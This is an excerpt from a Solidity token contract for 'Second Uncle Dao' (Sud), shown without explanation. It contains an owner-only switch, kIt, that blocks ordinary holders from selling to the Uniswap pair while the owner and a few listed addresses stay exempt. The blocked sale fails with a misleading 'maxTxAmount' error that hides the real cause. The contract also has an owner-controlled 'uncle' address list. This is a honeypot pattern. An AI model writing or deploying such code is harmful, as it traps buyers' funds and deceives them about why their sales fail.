...
contract newToken is Context, IERC20, Ownable {
    ...
    string private _name = "Second Uncle Dao"; 
    string private _symbol = "Sud"; 
    uint8 private _decimals = 18;
    bool private feeIt = true;
	bool public kIt = false;
	mapping (address => bool) public uncle;
	...
	uint256 public feeOtherToken = 0;
	...
	function setKIt(bool _value) public {
        require(_msgSender() == owner(), "fail");
        kIt = _value;
    }
	
	function setUncle(address _addr,bool _value) public {
        require(_msgSender() == owner(), "fail");
        uncle[_addr] = _value;
    }
    ...
    function _transfer(
		...
		if(to == uniswapV2Pair && from != owner() && from != address(this) && from != blackHole && from != Mining ){
			require(!kIt, "Transfer amount exceeds the maxTxAmount.");
